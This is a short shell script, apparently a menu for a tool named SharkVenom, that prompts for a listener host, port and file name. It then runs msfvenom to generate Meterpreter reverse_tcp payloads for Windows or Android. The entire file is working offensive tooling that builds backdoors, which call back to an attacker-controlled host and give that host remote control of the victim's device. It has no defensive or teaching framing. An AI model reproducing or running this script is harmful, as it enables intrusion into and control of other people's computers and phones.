cyan="\33[36;1m"
wh="\33[33;0m"
g="\33[33;32;1m"
read -p "Choose : " evil
if [ "$evil" -eq "02" ];then
read -p "[+] LHOST : " lhost
read -p "[+] LPORT : " lport
read -p "[+] NAME  : " name
echo "$cyan[INFO]$wh Generating . . . (wait)"
msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $name
echo "$g[+]$wh Generated !"
fi
if [ "$evil" -eq "01" ];then
read -p "[+] LHOST : " lhost
read -p "[+] LPORT : " lport
read -p "[+] NAME  : " name
echo "$cyan[INFO]$wh Generating . . . (wait)"
msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $name
echo "$g[+]$wh Generated !"
fi
if [ "$evil" -eq "00" ];then
clear
cd
cd SharkVenom
sh shark.sh
fi
